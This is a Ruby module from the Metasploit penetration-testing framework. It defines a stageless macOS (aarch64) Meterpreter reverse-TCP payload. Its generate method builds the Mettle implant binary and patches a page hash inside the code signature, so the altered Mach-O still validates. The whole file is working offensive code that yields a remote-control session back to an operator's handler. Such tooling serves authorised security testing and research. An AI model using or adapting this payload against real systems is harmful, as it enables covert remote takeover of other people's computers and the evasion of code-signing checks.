##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


# Module generated by tools/modules/generate_mettle_payloads.rb
module MetasploitModule

  CachedSize = 827315

  include Msf::Payload::Single
  include Msf::Sessions::MeterpreterOptions
  include Msf::Sessions::MettleConfig

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'          => 'OSX Meterpreter, Reverse TCP Inline',
        'Description'   => 'Run the Meterpreter / Mettle server payload (stageless)',
        'Author'        => [
          'Adam Cammack <adam_cammack[at]rapid7.com>',
          'Brent Cook <brent_cook[at]rapid7.com>',
          'timwr',
          'usiegl00'
        ],
        'Platform'      => 'osx',
        'Arch'          => ARCH_AARCH64,
        'License'       => MSF_LICENSE,
        'Handler'       => Msf::Handler::ReverseTcp,
        'Session'       => Msf::Sessions::Meterpreter_aarch64_OSX
      )
    )
  end

  def generate
    opts = {
      scheme: 'tcp',
      stageless: true
    }.merge(mettle_logging_config)
    mo = MetasploitPayloads::Mettle.new('aarch64-apple-darwin', generate_config(opts)).to_binary :exec
    require "macho"
    file = MachO::MachOFile.new_from_bin(mo)
    hash_index = mo.index(["f091725182ee6dd2ff53529230de1a2461899568078a440c03205c9cb5897d00"].pack("H*"))
    new_digest = Digest::SHA256.digest(
      file.serialize[0...file[:LC_CODE_SIGNATURE][0].dataoff].bytes.each_slice(4096).to_a[157].pack("C*")
    )
    mo[hash_index...hash_index+32] = new_digest
    mo
  end
end
